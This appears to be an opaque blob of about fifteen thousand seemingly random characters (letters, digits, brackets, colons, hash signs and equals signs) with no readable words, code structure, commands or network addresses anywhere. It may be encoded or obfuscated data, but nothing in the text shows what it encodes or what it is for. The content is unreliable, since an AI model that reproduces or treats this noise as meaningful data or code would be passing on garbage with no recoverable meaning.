SS6:n4(mmmS1Sqqnj=j:C-(#So:qojJjS=.#n-m CnCj=jm---wmCo(Son4:S=jmjm(oqnnnS-S#o(JdSo(jn:64o-q&=nJ:(j4=#4_-#h-oJqj:SCj6S-.7SjSno6JCS#qinoCoCS:C=Cm-n-4(#q(:C=m4J#jqj(#n(=(=m4m#JJmqSn4j#4:4C.mo=(onCCq6#-C(mJ#:4S4=n#jm(m(JQqn=S=N6-o#+J(6nonm=--4m=qjSoSm:S6SJ4mjoJ:#:(=j#C#4{JJmS-=jCJ4mmoJ6oS=J4J=j-#J((Com=4Cm4J-dJ(S((b::6S=m--m4qnj(n#4S4Ckqon(RS0j(C##6m-JoqJ=#:#4p6*-mJJnq=J6j4J-6m#qqqSjoCJmjioo:SCqm:J6q#JJj((n(j#C6646m-#n#S=:64o-V#S(4J#q(:=4S2h8(JJoj=jj46(m(-0(m(JC4CJ666C16qoqmnCCo#nK:Jn(6n-6S-44j(jJjo#n6jj=46Je:A#jjj==C#omSJoJ4S=:44o#C#CJ6SSS4=J446Co(JC:S:S=4=##jmqJmjCSmC-4o#Jm4(nS6C-4S6Jm:Sj(jSC:64-#6JSnJjJj4C=6j6#.:o-CJnJ=##o#mq#q:jS::6Jb#((?=qmSmj6C4_JJjJq(mS#=(6--mm:S6(Cjg#S=mASK:o#n#CJ=(6C(SJ4n4q#:N##6j-#J4(CSj==666#J6J6qmCSCo/oo#pCojn#::=S44-:oUn#SmC#=4#So4o=q?S#:jmS#4onJjjJ:6-(#6-C(mq4nqj:C46qm(wS(mCSC:4--qJn(jjCn4=o=j##m(j(n::#C(#4-4m#SCj(C6CS-:oSJ4S=S4j#4(-oJqJSSm4:Cj#nm:mCqSn4joC:4-J#qoqnjSjC#4-=mjonS:SCC:4--qJnohq(SmCS4(-Smjo:q-C(=I4S-4oCn4nJ:l4n#6e-((nOC64J6qo(e(nmS6jS=:#j#jmCnqqSCqCC4jm-JC(JqmjS=4ySo4qJ(4nC:mmm6mJCqqSJ:6:C6(#SF(oJnqC=4q#nY:1CnmSS:4#J64JSnCnoSm:S4omj?jq(q(=C4SmSmwJJSjjnj=CC64>=o:nDj6:C==mSm(n4CJjJ=#4##j(ConqJ:m=-mjm=q(o+Sn6=-CYmo((Jq(n==4=S6-mrqjq(nn4S-omn<-qn:Jj-CS6om(3:(CSCjA-6#S(joJ:q==64-#&!(SnS:-jn:#4=-4m!(JSJj:-qbC-6rmqJnC:qmn6-(noqjJ=q6--mE4qqo6q(nw=J4n-jFjo-C=:(-S6m(oJ4j-nj6C-m#Cmnon:j=-Cn=##=*4JsSJjJC:cq-#qm(SS-6==om:o4q-jJ=-jX4o#4m:n6(Nj(:==m#:<ojnSj6o=(4{-0S=(o:Cj--jGj(-J^n#=:ComJ*6o2SC:44S66mqJ4SoomS:46=n 4JTqqjoCm4o-Jzno{nn(:n=C(=_oqm:o4qonj:94=o-rmjoS44-=jNComJC(:Sj:4mn6=m#Jq(Cno:6m.-Jq6o#q=j=-q4:-4>oojqxj=--6m(=J4(:n:6C=n#C-5JS(-n:#64-L#BConSn4j#-U(oCqm(CSn:n#S-qm:o6nq:(jE=CmCm-J:(4:#C:4#mj((J4So4q4##q-J_(o4:Sj-=CT6mqSnSmj==64J#oJ(qCn(S#6S4=##?m(jSo6q=Sm(o-qmnvC:4:-(NC(SS-qnS#:=44630JoJq:4q#C46#mJJ(CSq6nC-FnmqqJjqC-4m#4Jqm6J((MjJ:n4j#jm-n=S(4SCmvo-4q-(j=o:jCT6p(=J4j#=(:#==#=(4noq=nJ:-4m#qVSoSq64:=J*(-CJoj-Sn=6#6Yqonno(qnn:m=6JLmqoj(-n(:64no=t4jnSjjq=qt--n(#(oC444mo#qoJS6qn=n6(-=Jo(mnC:o=(6-mnJnSoomS:46=nG4oSqqn4Cn6S#n&Jo#qs:6S-:E4C#nq=J-SJn::#4n#YSq(SC::J-q6#(:J#(nnn6W4JJ((Co(qonJCSma#q;jJ-q(n6Cn}=-4Sn(jSq:q--6omS<6(JS=:qm:#CqqoSqojo#(=b-(m=Jmq:jo-n6:JjJ(o1SF6J-:t#((Jn(Cn4C(=-Jkm(ojjS=WCj4m#nK=(Jq-n6#m4m-oSo(=SJj-=m6qmSJS(6=:6#==##mqJCqon6#)6jajoqqoC-jmC666o#qJ(nSC:44(6-(eJXnmn:6==4#omm(fn4CJ46##o-QSo:Caj6#-6(-6(4q-njCJ=-#(ojJ6(mjJCC4qonm#SS:q=(C:44-#JSos=oj6#J1JJmJq(jnCCJ=6J--4q#jmC4:_4(-SB#o:C=n#6Cm=JjU6omnJ:C=qJnmng#(=n4j24J#Jm:n6q-j(#n6JJ-qon::-4CC64mmJJC(q=n:4#S6=(nJmj-=:j4--Jq(=JJ:4jm6m6Coqq4jJCS446m6q-jJCqJS66-=*m#oIq4qo=q:64S#6bno4(OCC4Jm{-:mmo6S#jo=(6(-=Snj4SD6o6m-qm#qqSq:E4n6jJ-q(o-j4j=#CmCo1JJo-S-4m=o6SmjJm(==6:6=(6g.JJnqjnj:-bo-(qnon:-j4##6(-6S:(C=qjn=:#J--no(nnCj5=S6-m:n6q-4:CC4n-n(S(ojmjq##6=JCJS(ono66=n6Cm4o((-=w::-X#-(6omjjnn#:mnJam-n6SC4:=Ccq-6q-q=nS:m=#-)3-(-SC=C4#4o#SRjomq=46C64(#TJJonSjjjC-Jo-:Snj4S-:J4(#4mnn:({=:Cn-(#6(-(=SSjmC##Nm-o-qCC=:j-o6m(oqmj=CC6C-6#C(6SS:qC/#(mjJnqSSCSS4:#q2(Jj>n(CqPjSC-6:(qJ-j-C64m-qJj(4J-jjj(:}49tmQqojSC:JC6H--6(#o6Sqjj=#m#moJSqjnm:=m6#=o4S-Cqn-CJ6(-4dnj:S:nmC66#-oJ(((S=6-4oJo(jJ=(#nmCj4ooqbSS(So4q#C-#-oXS(jSmj=-66-J4J=j6=J4S==6#mmojqo4q:--(JS(JonqCj4=(4-oxe(SmC=j=-n68o-qmj=C=6o-mJq(6S:So=(6=mCJmq(omjmjqCj6CmJ!6j-Sm=#=oN-m:SnjnC#6:-jIm(#SJqnnCC46(#-q.(ojm4=#QdJo(SJqoS:6q=-*6o4So:J=j444(#6(NoCjjC#6}m##:z=((qi6q=J6=o-ACnS:4:n-46nm:oJ(-4o:n4C6BmSJ-q:46C-m-J-(C(SSqj(=jJom(qJj(:m:q#Cv6ojo((/nR4m44#=mCo#qmj:#66SJ((Cn=Co4q#j%4-nJ:qJS-#o=n#C-KJS(-n:#q=m,4(JnqCJjmC:6:o=JqjqC64C-J%n((SC(CS6664nJn(-S6:(=:#Sm4LmU4o:S:=jCn6C# 7So-S:66=:L=->86(jS6=o#j#Jm4nnqL=-C4mCJ4qonn:444#%^:-=SJj=SS4m-6_:0oSJj==C6mmS,ClSooSo=JCn4C-4J(o-C!jJ6m6-J#Jo(Snj:m==J6m6J((djJ:n4j#jm-joq#4nC_,J-q,j(CnJj6--6nJmJj(d=q:q=C6=qqon:jnoCq4##=q-oLj#n4#-t(Jjpm(:C6:n#(mCo6SC(qnn:m=6JZmqoj(-n(:64no(qCS4Sjjq=qm(-mL6(6:4j-#S6-o{J4S(S-jm4J6Pm-(n:6jC#q6JoqqJn6:444#-64o-qjjnCo6S-C#n((SS:(CjC(mn#NqJoqqjjC=J46o-pmS#C-6q=n6(-nS-(T:#6:-SJJm=Sm:o4J:6m.-om#joS(=JCmm6oo)6n-SCCJC64#-m+-(6jq6===JomyS-q6=#Cj4q-qq-ooSSn6CJ4=-qS:(C:C:S=o#ooJJn(Cn4C(=-Jfm-qm:mn-6p#C-lm#Jmqj=JC=6So6O:j:Cm:_#-mmo_o:jnC:6mm(JC-=SJ:(4=Cq4j-CJJo6C-jm6#66J4v^((nS:#=:J=m=JJ(-nm:q4S#Sm6ntq=jj#=m=J7qnjJq-:JC:4#-nKToCC66o-:4m(nJ-jAnm=:=n66m#(6qJCq#6M(o#qmnrCq4=#5t4mSJoqo=6:n=C#47(J-:Fn0:j4q-Sm=o4q4jo-n4--#qOjSS:j4=##S-0noqjCJjCC#zSm=J#qmjjCo^q-S((J4(m=jC64mmJJC(q=nj=#S4#-JqC(-nJC(44#nq:o:jjSmCmm=#=qno=SSj:#-64#CqJ(nSC:44(6-(EoJnmn-60mS#:m4o#SSn0-o4qJJmCJ#S=jjC=Jo-SqJj(C-:4mn#:m(n:qonSCj4m#=q6oqj4jm#6KJJS)=o#Sm:j=oJqmnqS(#nn6===FJojSj:jnoCq4##=q-osj#4:=j+qoCm=nJ=JnmC(r#oJJ#(6S4:m4J#=(-J-jSC466m4#ny:(Jq-6oC64mmJJC(q=n:j#S#n(nS4nmnj:3m6#=q:o#qnjn#Y46J-m-qnjCC4=o#J-4JSj=S-476C#O-#Em(jCJ:=4SJ69Snj:=4S#qmEmo(tnoCS4#-:v4om3=(6nS:omn#joSJ-jKC(=n4-mqm(qJSjCo#66Soj(4(jSq:q--6;J#J4n4nj:n=S#Cm4oq::n:4m-SJ:qSJRSoj4C:}6--(4((C66J#S#J--J-n#S=CC=j-(oCo:jjj(:;43bm^=(4:C:S646mo6SJnSS^j#CyJ:mCqjjC=qComqJCtqJmCqn:=S6JJmq=jSq(4(:#!jmC(m(qn(6n-4mmm4J:q:CjCo=m#oq=o=jC=4#n6qonq4(nSJ6nCp6(mSJ#(:==:4#C##(=Smj(n4Cqm:#:qqo#:6=##:mCoj(CSmCo4mC=66mSJo:nS}:(4S##m:n=SJCC:-m=-(qono:-=###mJ-n_C(4n(j--W66JmJqj)nC6:-nJqovn(jjn6:m6J-ClqjnSj=S:#4-o6SJjqSn6q-Ca6-TJ4(-=q::4(#n-4S(q4jq#:6jgm(Sn:CSnV=o64-:S6(#n#:o4jm#-US-:(CjC(6(#SL#S(qn4q#C-#-C9:ojS4j#=nH=mCqJnj=jjS-S4m(CJqqnnm:6m7-JJJonS4=JCKtooj(4(jSnjS=C64mqS:qj:m4S4S-((oo#:jnoCq4##=q-omSmjq=C-m--q}jSCj6o#-#:o4q6jmnC::=j#4m#on:=jC6J-j-jJSn(Sm4CCq6n-m86j/nJCJ=n#4oJJ.:o=j6Cmq__1=S#j-4JC464##JSS4q-46-JmSmJK-(-:#:S=-JomoS-qo=n6jmoJ(qJS(jC=4#C4q-nVmo6C_:J4J4mm4qJoLnm:4446C{So4qCnnCnm0##cnn=q=4nC=m-J-q=n=CC=4#J0((J*6(-nj:qm:#CMCJ-S(CC::6j-(J(o:S#:(=J4---S:(SS-6o=o*-moSnjS=o6JmJA(oCS4:CnqCn4m#6qN(JnJj(=4mJ#VJm(4n4j#4S#4mCJnqn=HCS6J#6+4SJqmCmC44:-:So((qtj_6m4-mJ8:o#SnjMmq#qoSoJ(-n-4#4o#S^jomq=46C64(#bJJonSjjjC-JomqJCj6S66q4oE.m#SmqonSCj4m#=q6Jmj4j=6C4--JJ((4Sn6:C4mjmSqS(qnjj-=(66mnn=(-=-Comq#qJ6qmjJj:=j6J-4q%(qCnjn4-mJJ(J=qCn(:#moJ:-4oo:qn6CS46-nN4JljCCJ#04go4m#jjn44=4SV6m=S4j-n46#m(##m=o=Cqn-CJ6(-4cnj:S:nmC66#-oJ(((S=6-4JJom4oJj<jJ664mJ4m-oJS(j4Cn :-:mmo6S#jo=(6(-=S-(nnS6:-:L-(qSmqonSCj4m#=q6oo:6nC#:6:oqJo(jCn:J-o6/o-%-j=nJ6n=4Jo-=S-q:==:--j#6mm(JSCjq-n6jJSq:n(q#:o=j6=mjSSjjCo:mm=#6mjn6qCjo#-mJP-(((JC6n-CR6C-nS=(jS{66#-m6mCnq(nn:CJ=-oommo:CqjS6omoo6m-oxSCjn-=6=-jX=:onq4J#wPo(qq-jC4oCq=moqlJo=Cnjj:q-4JCSqonS::JC-Jom(qJjjC:4S4q6=m#ojq(CCCS4o-o(Joqj4n=#6m(oj(4(=q_:(=#6CJmJ4(:n:4j4(#omJoS:pjJ4mmSJn((omq6j6-n6j-n<S(C=q:J==Jnmjqnjq=-jT4o#4m:n6qjC4:(=jlmI(SCqJ4q#=m3#j(m(4S=jC=#J:-qqj(+=oCJ6=6:--JmS-n(4nm-oSqmjJCo4n#60oo#qmjJ:#:n#j4m-(q4qjnqCqm-#mm6o6CnjjCn4S-CSq(JS=6n#6mnm(S-o^no:4=:J6mCoo:-=(4-44onm:o=S(nd-q6nJ(qCn:CJ=#C6mjo#qmn4nj:n=S#Cqqo:j(no#q-6J6(SS#:-=##=m4J=q6(CSm6J#S6mJmJnq(=-:+4Sd((nSJq#n=C=Eq-SFqo(Sj6oC:mJ#8Son=C=44##s6o#S:jJC#6=4j##(mS((mC#:6m-JnqnSm:S4:#:rqJmqnjnn(:C-4mmm4J:q:4oC(= #Fq=o4jCjj#jmjJ(2mo6S6=4=n6(-nS-(m:#4O-=6oqooq(m4qCJ4=J-BjSqj4j6#44n-:JJo-=oj#4(6mo#J-qC:m:S4##C(CSCS(C4Cj4n#SMCjqq6:S=J6mJSw4q(Sm4m#m#CoJJ#(=n=4C4S#o_oSJqnnCC46(#-q;(qjmn:#466oCqCjDS=j#=m#jmonqqSCS:==##mfjooCqnn6S4=##ym(jSo6q=q44-:JCo-Smjm=nJ=m(S-j-=q6=mS6#voojq=jj-o4q#6mm(SC9:oC#Jom(g}(M==:4=:#:qoJJqnn4:-44onm:J.q(jC-q6n-JSn((S66:==m:o#q6jn=6j-=U#Cmnn=q6CCC:mjJq(6jqSSjo=of6-#(4o-nC:n4(m4-:qSq(j(j44#LSm#onConq43-jJq(mjnq:j==(4t(qJJ(==n4(#sm6oJe;:=S6:-4j#qq:oSq-4=:6-:J4qonoC-n^=o64-:S6(Cno6-CPm6o(SSj4C##:==#61SooCnj(C6h:J#q(nJ:q=CC:Jo-qJn(mS661=##nqoJqnsCj6C--JSq6J-qhjCCnc=-j;Lj6q-==#JF(oCqC:nS::=4(6/qqJ:q4nnCj6J#qq-o4Sq4BCo=-JSqjn6C(6=C66-mjJq::n#CC4S-Sm=omSSC4:k6C-SJSo(Sm:S6#66-oJS(mS44J=#6=m=qC(-nJC(44#nq:J=jCjqCJ4qo6J(S4:-4:#n?8mo!#:oSm::mq5:oooj:6S-:t4C#nq=ojq_46#o==JJJSj=q6j-=j6q(:G>j6nSCS=(#m(no(S(n:C#mjV41:SSSq4(#(-m-4(Co6nj:q4JmCmSJq((nj#o==-(mmom(#jCCm-S#=J(omSmjq=C6mJjJqnJSP4m#mm4mjqS(:j(:*4#rS%JJ-q-4:CC4:#j*4jnS(j6-:6mJ:(#n-=nj:==#(-Rnq(6=:CJ6J6mK4noqmjmCq6Co((j(q:Jj_#mmmJ4JjnSS:C(=p##oSoJ(KSmC(m-#4_qnx:SS-6S6Co-mi(oS4j:-64.m(v-(mnCj6mn#(m6n:qmCn6jmg#o*qo#q=4-C46qo:w:qJS#:#C4#jm#_onCnjCj=C-J(4Jnq:jJ:-do-q(Jox:m=m646j-n9S(C=q:n#(#JwJJnq4C(:m=6#6o4o=(%j(C#4C3m%4o:S:=jCqmJ-mJmo#nCj-4j6q,Jqj(6jS:o4mJ=bonnqn=-:6m4J4qn((n(j:=#hjo#J:nSnq6(-(mmm4qC(6jjCq6J;CmSooqoj(Cnh:#=iooSS4=4=j6n-SJC:qSn4(4J-J-mo4(DjC:n6(zCm-(jqq:J#66qo:l:nYq-4###W:mSoS(=nm6C-m#=ojon:S=S6J4#94m-(CSn:(646j-qJqj-Smj6=6JnmjJqqq=-:m=6#6qnJjqqnqCS4:o=m6oqqjj#6#6C-:Lj(4=nj9=(#Sm#J::=S6444n#(mnn-SSC#68m=J:So(qqm6q=J6=(nq=nqnC6-C3#om4J::6nCCom-Jq-6S(Sj46:-4,-CUnj=So4-=j#j-SoJj:nSCS==#m(Cq#q=CjCnmSJS(Jo#j4n-=C6nm((4(jSnjS=CJq-6oSqJjJjm44-JojJ6SSjJ=J4n-4JJSCSn=(=oVJoJ(#(C:jj=4S#ommqjq(S0:?m=#4m=JCq#4:CS4-o=JJS=jm=H-:4=-6JS(o=nj--=#(9(JJq#=qCJ6J#n+4nSjCjn6(6ooJqJS#SC=jC=#SmoJmnjn(:o=J#S(TJ#qn4o6jCN+j.4n_qojqC#4=o-io(Sq!:J=44-(:JS(-==CJ#:2CqoJqqnnm:6m0##&nn=q=:(Cm6m##JC(mqq=4=C#C-4o(j#S::=4(6Zqqonj(jo#JmJF#TCo:qjj4-n6:JSJ(q(S::##S#J--J-n#n6:o4S#mm4SJq#n=C=-C#n(((JnJnm=44.mCGnq(:Cj-4j6qUJS6qq=:::-t6-(#S#::jS=S4=-mqCnmS==j=nHSoSqJ(#:4j-4C#nF(q4(jnq:q4S#:q=J6qqnjC#-#-Cr:ojS46nC:mSm(o((Jn#:o446:^Sq4(TjC:n6(J-1nn=q=4o:ymmJmq=(jnjj64Jy4(JJ6nCn:6j-jh(mmq#(5j4C:6Sr#sConSn4v=J4---S:(CSn:n-+#J--J-::nC:n4nJl&JJe(mj(#-44-qqinS:=4o64mJ#^S=o6S-:j=qJ:moJSqjnm:=m6##o4oCSCnj=(4:mJY#(4Cnjn=m64o4q4qSCm:C=:6jm4nn(/n(CS4##:q=J6j4n:6S6(m(bJ(#So:4C:#SoYdZqCSn6S-S#m(CoqjJn56m-mL4fjSSq::(CR6#JSR:qJS#:#C4#jm#q(qjjJ:#4##oUjo#jSjo4m4-J#(#SCSS=(Cn#J--J4n(Sn6o=4#4-CoSj6nCCC=--((#SJq-C4C=mCJC(S(Jjmjo=#6=mj(mo6:C:j4j6SPJJnqmS6CC#m#q7#J=Sj4oCo64#:qjnjnJ44=nm(moSJjJ:#:C#j6=ISooqmCj:=6(#mHmJ#SCjm6S4=m( m(mSq:C=m#jm(o((Sn#C(#4#:oSoq:(=(4m44UCm6(jSq:J6C6J-=Sno-nj:(4(6Jm#o((onq:#==J-mAq#q6=464-j-(BooJSS4h=o-m-#J#(onj=m=46:m:qjq(S!:!m=#4m:o:Coj(Co4J-SqLo#Sn6oCqmoJjqCnm:<66C-6NmCJn:=nj:*m6JJ(jSC(nC#:6Nn#:R=((q)6qC6b:mJoJomn46o=m#mmqoC:(CjC(4o#JASn&q:4qC#6##4Jjn-S4:4CQ#Somq((M:#:6-4V4ojo(jJnqCm46-C(JoqS#jC=C4jm(JCSmn(:#=C#C--o(qCCJ:-#4#=(CSCjSjJ4m4o-#?=(jjmjo#-6jmjlSqJC::S4S6=mmSCn#n=4j4nJS(SSJq#C4:-6C-nJ(S4q-:j=(#(-JJ#q(:C:#4j#(V(J:q#j(444:US%qn(:(CmC4-C#6Jj(qnJ=CC6,:mJoJomn46o=m#mmqoC:(CjCq-J#A(mSmj4jj6S4:m({+(#:Sj:4J6#m#F4qjn#4(4j-Jm#o#qojjC#-S-oomo-:#=#6C6SJ(ZnqJS-:4#(6n(oJ4q4SCCS-6#C^CJ-S(=#6J4##=d=jqSSjqC(6j(ofm(:=q4C#mAJ#-qS(q=-j/4o#4m:n6q6nC:6Aq#L((n(:j4n68mC(qJn(J=n:(=6J:-=qnjCCm4mm66-mkoCqn4=Cq4j-CJJo6C-n56m46JCJjqjSSCJ=n#m-6oC:qnqC#==JC(C((:#j:6S6qo(q(SmS4=CC6#jmqoJnCS6CS4J-J-mo4SJCjC46S-JJJonS4:J6C6nJ(JojJCJ=#=Cmj-=oSqonm4j==-(mmom(#jCCm-S-CJ(omSmjq=C6mJjJqnJSA4m#mm4mjqS(:j(:<4#xSm:(Jq#j#:46j-#((o:nJj#=#6omjJ#qSnJCJ=(#4.JqCqnC(ComJJJo#oCjjn==S6o-m(jo=n(jm=m4#mCJmnSnCC(=m#mmqoCqmCjCq-J#y(mSmj4jj6S4:m()/(#:Sj:4J6#m#G4qjn#4(=:-Jm#o#qojjC#6S-JJJo(S4:J6C6nJ(JojJCJ=#=Cmj-=oSqonm4j==-(mmom(#jCCm-S-CJ(omSmjq=C6mJjJno6Sm:C=Sm4mjJqqqC(::=4##5SJ)Con-#o=MVm+on-Sj:jCS#Jo:JSqSS=:m-Cm#m=qjqn=S6S-J##o4J-SCjn=(-4-o(S((n(j:=#mS-o(m(qn#:q4j#qmJJq:6n#444qJC(CnqSJ:JC(64-={Sj=q6=CC:hqo=f,qCnSC(#4#jmqoqj(nnCm44-4mC(SS4=J:i-m-6(C(:Cj4j#(6mJ#R%q4n:CS###mwCoSSSn=Cm6SZ4me(CSS:SC(6mmS(#(=:j:n-S8SoJJ#n4S-CC4n-(o4J-Sjj(=(4J-#J(SCS#:j=(#(-:J#q(:4::#S#q((S(nmn44C=6-jlq(JjCn6#:6JmJmm(4Cojm=m6qmCS(njnq4J=<tmomq4qjCS::6(#K!#SSq::JC#6##4Jj(#:(:j4J6#m#Joqjn#4S4ommm-S#j#CCCS-(#nJJo-S4=(Cn%o-4J4oCnS46=C#C--o(j#CJ:y=n#C)(JmjSjJ:-4-A#ECo:qjj4-n4V-(JS(#S:6=C6m4-:qSq(j(:J4##oH4J:SS=_:e6C#nqSnSSm4C=qmJ-_qmnm:4:j#S6:^(J+q#CS::6J##7#J4Sjj#6(6jmJi#(#So:j=#mSmo(m(-C#4##C#So(JnSJn-C4-(#nLmo4S4nC=S64JJJS(mS4:4C%#Sm4q((3:#:6-4F4ojo(jJnqCm46-C(JoqS#jC=C4jm(JCSmSq:#=C#C--o(qCjJ:#4#6mUjo#jSjo4m4-J#(#SCSS=(Cn#J--J4n(Sn:m=4#4-CoSq4CJCS4m#4M4JHSSj46(4cG#}6n4:4=j=(mJ-qJm(6nC4J=q##mCoC(jj(CC#m#q+#oCSCn-=(6CmJh#(#qm:j=#mSmo(m(-C#4##C#So(JnSJn-C4-(#nImo4S4nC=S64JJJS(mS4:4Cf#Sm4q((mS6:6mn#jmqoq:-nm:646onpjonqSjC-q6J-=Snn4CJ4:6)mj-nS.(onq:#==J-m4oq:>=S66-CX6(JJ2C=n6C-6j-qS:(SS-6=C6mCJmSJj:CS#q=n#:sJJ-Con6:m6J-C3qjnSo4nCqm(-nSo(4n4jC4SL6mCoC(-j(6#-J#-o4o=:C=C6S6J/mto(#S=:j6m6om4JjqjSSCJ4jm#YJo4qjjj:66J-jomo6jCj:#jmjJ(KmS#qB:4=:#SJ#l3qCnSCS=(#mHSq4qmjCCS6S#=1m(Sj#j=6j6noSqSnJS#=4C-#Cmno(n4no4S4(-(m:o#jSno4m4q-#zq(jSqjJCqH6-#(4(qCC4C-q#J.JJ(q4n=:Sm=66oCJ::q==:P6C-SJ(S4Sjjq=qm(-nJm(4n4jC4S#4oJW*nmn64C4:Jj(jS(qmC#:L64-:JSS#Sm:C=S#S-=JmqS:4j74C#S3SJ(qmjS4#4=kj%nnS:S=JC#-4#-JC(nn(=4C-#jm(o((Jn#C(#C##hjo(S(n:C#6(_4A:SSSq4(#(-m-4(Co6nj:q4JmC-6oSqJjJjm44-JojJ6SSjJ=J4n-4JJ(CSS:SCj6mmS(#(CS:jj=4Jnm(J6::SW:S=nJ5m:(Jq#j#:46j-#m6o-Sjjq-:6=JjJnjSCS4J=#66-4Jm:=n64C4j-jm6(JjCjSCo6oJJT#o=S=6q=S6q-(Jj:oSm::mq<Co0Soo-CS:qm-6&*oo4q:46:Q6(#-tm(Cq66n=(66(:h=on:#4m-n?SqoJqqnnm:6mI#:JJo#S#n4=j6#J(!:qJS#:#=o#jm#qSqqS=:#4j#(oCoSqojo6J4qJzkC(Cqj:(#=6jmj06qJC4=m=6mCm:SjjjC(:m##6Xv4o:SSC#Cm6C-SJSo=Sm:S644/mCJSqSS(:m4Sm#m=qjqn=S6S-J##o4J-SCjn=(-4-#Jj((n(j:=##(JCp-qjn(C(=J##l(q4q:CSCqm(J(omo4jCn6=j6qmJ(Co6C::J4J4mm4So(mnm:q4CJ(ojoqjJny6m-mN4gjSSq::(Cs6#JSP:qJS#:#C4#jm#q(qjjJ:#4##o2jo#jSjo4m4-J#(#SCSS=(Cn#J--J4n(Sn6o=4#4-CoSj6nCCC=--((#SJq-C4C=mCJC(S(Jjmjo=#6=mj(m(on4:j4j6SwJojn#jJC44j-jm6(JSjCm:44:#:.Co6C-ngC:44mJqJ(#S6j4=mJ=moo4qjjj:S6J-jo#ooS4jj=j46mJJjSmS4j:=:Jom(&_(H==:4==6Cm#n:qSn-#==6W:omnJ:j=4-q4n-:JJo-=ojm=:Jq-nqonCC46J-:J--/ooq4n:#6=r-(m-omSCn6-n6(-6S:o=qn=##mASo:no(qnn:m=6J?m=J#qmjjCowq#n(So:nJj#=#44mjJ#n(njCJ=###moojq#CSCo#m#-(#S#jCjS6(4nmJK-(4:(jn=m64m4pCqSn44J4S#mm4o4(RjSC4-(#to#o6:4=46j6(JJ^q(mS6:C#J6qodJCqCSjC(-=#jVjJ6SJ=44m46cC^:nj:j=(Cm-##?J4(:nS=#C=mjmSoS((nm:q4#6=%jq#qoj4::6SJlmr(Cqn4S#S6moCJqnJS*4m#mm4mjqS(:j(:{4#ESm:(Jq#j#:46j-#(((jnJj#=#6omjJ#nSno=m=-i#o#qCqSC(:n6J#-*4S(qn4oC464#CJSn6SC:CC-#(o#qJ(-:4:=-C?CoSoJnmnoC#4=-jomJ6jCjj=j4SmJVn(mq6:C6m6qm#N=qj=o:o446:(jSjSJ=4C:=--Jd4ojj#jCCn6nJS/:qJS#:#C4#jm#q(q(=qj#4##CdCJ-S(jC6p4q#m on:S44j644j-q<q(SS:6=C66q-jJ#n#nC::=j#4qnJ^q(jSC#4:o=m6S4q-:j=(#(-JJ#q(:C:#4j#(i(J:q#j(444:{Sbqn(:(CmC4-C#6Jj(qnJ=CC6#SmJoJomn4CJ#j#4_SoJSJnnC46J2CDnS(So4J#J-#-C(jo=nS:o=mmj-=Sn(mnmj#4CMAm#o#qojj#J-S-oomo-:#=#6C6SJ(1nqJS-:4#(4_J#J4q4SCCS==-(-Po#j(n:=J=--4qnonSmn6#4m4mSqm(=:j:n-SUSoJJ#n4S-CC4n-(o4J-Sjj(=(4J-#J(SCS#:j=(#(-:J#q(:4::#S#q((S(nmn44C=6-j1q(JjCn6#:6JmJmm(4Cojm=m6qmCS(njnq4J=)Vmomq4qjCS::6(#zp#SSqoCmC#6##4Jjo6nSjo=mmS-=o(oRn#6:=:-J--S#j#jj#J44#:G:joS(joCJ6SoGN#(n=o4j#-m4J-q((o=6j-=O#Cmnn=q=nj:=Qo#:(Jn(:q4q6.m=(oJqom=q:J==Jno4SJjn:?j0m=66m-ojqq4:Co4S-jRmo=C6nm646CmC_jq(:4j{=(#Sm#J::=SD4C=--jmS(Jq:n4C#6S#*Sooq:Jjn=m4#o4q=qS:#:S=-Jo-6q:j6=C:q4n#mm6nKq#jn#=4:d_Gn(mq#44#4#SomG=(6nS:omn#:oSo(S(n:C#-S-Jm/JmS(4-Cn6m##q4nCnS=4C-mCmSJoqo=6:#=664mmoJq==-:6-n#=J(oJ:m=m=CQ(#-x9(CSn6==6mCmjoj(6jJ4C4S#qm(ojCon==(4JJm(#(Cjmjo6#6C-nJnjgnqj==##jm(qCqSnoCo-J#qy#oCSCnj=(6CmJ+q(#SC:CC-#(mCJmnSS=C(=m#mmJoCqmCjCn=6#myCoSj4jjCq6qJ(rmo-q#:J-66qm#JCqCSjC(4C-Jmqo#qCjC:-6(-ClmSSq=:(Cm6m-JJC(m:j:(Cy6B(=J4(:n:#o4(6Emtn=q4n:C:.o-(0ooJSS4PC#6n(ozqno:44J-y6omqJ#(==-:44qJYmoq-jC=q#-=b-o 4o:C6jC=o>-J4q(nq:Cj:mo6qmnJm(6=d:#4noomqDfjj=J64^n#:w=((q96qC:64-nJjqJSq6-=4#q(ZJoo-CS4m-noqmno:SJn--o4=m(>m(mq#:C=mmSmSSnomnm:4446MwSo4:onnCJ4qJ=7#nCj#j6Co6S-m_4nJS#j===mCmJJ=:nS-:(=qJ-mnomq4j4:C6S-4m=o6SSjo-n6:JSJqj(C(=m=46=-CJ#::n=4j4S-Sm=omjjj(:c43hmm4o:q:jCC6Y-#Rz:o4nJ4J=#66-4Jm:=noC44j-jmS(JSjC#C#m-#jJj((n(j:=##(o=D-(CS66o4SJJoSoJ(-n-#:4C#:mjo4Cnj(C6^:#=(nS#:j4q-64--GJC(n==:==j6=qooCjJ=(6Smq^g(jjoSqnm-q6J-=Sno::n=m#:Jq-nJ:qJS-#o=66mtJoCqq4nComn-C((o-q4n--n4:JSq:jo:T6==66j(6JCqo=-6o#-R(mon6(-n<CC4no=Kjo!C6n-6=mJoJS=o6S-:j=qJ:mSJ-:=S64=-:oomqonqmn6#Q4:mJQ#(#q4:j=#m(-:oJ(#n#:o4j##9SJ:SJn#C#=m-jE#((j4j:6S6qo(q(SmS4=CC6#jmqoJnCnS:q=(#jqoJ-jJnmCm4q-C(J((j4nQ=C4Em(&Ao#q{6:=Cmj-0SSjSC3:#4#6m2jonqJ4nC#-S-C(Knnq6:S=J6mJjJ(ogS;=m=o#4mjoj(SjJCj##-Jo4ojqqjq#-4m#-m#(JC6jq=#6CmCajq(nC=m=q##mCoC(-j(CCmj##8#JmSjCmC6-C-:qjnj:(jm6#4pm4J:qS:#:C=n#n(AoJ(USmC(m-#48qnNqoS-6Sm4J4SqonS::JC-Jo-nJC(qnS:m=oJ6mCoo:-=qj6-(#oq6J-q2jCCn5=-oJ4(jnjjS4J#jJ#Joq4njCj=6-JvjSmqoj4Cj6j#CJJ(jjmj66C6:ojqjn(Sm=#Cr#4m:oSn#n6:o4S#mm4SJq#n=C=-C#6JS(JnJnm=4#JJjJCqSnJCJ=n#4BJqCqnC(ComJJJo#oCjjn==S6o-m(jo(q/n0=J6q(nF:oZS(:C#C#SmqJ(qj4o:=6(#mXmJ#SCjm6S6jm(Mm(mSq:C=mmjmqqJ(cCm4m#4#joSJ:S(n,C#-S-Jm-o-C:jCC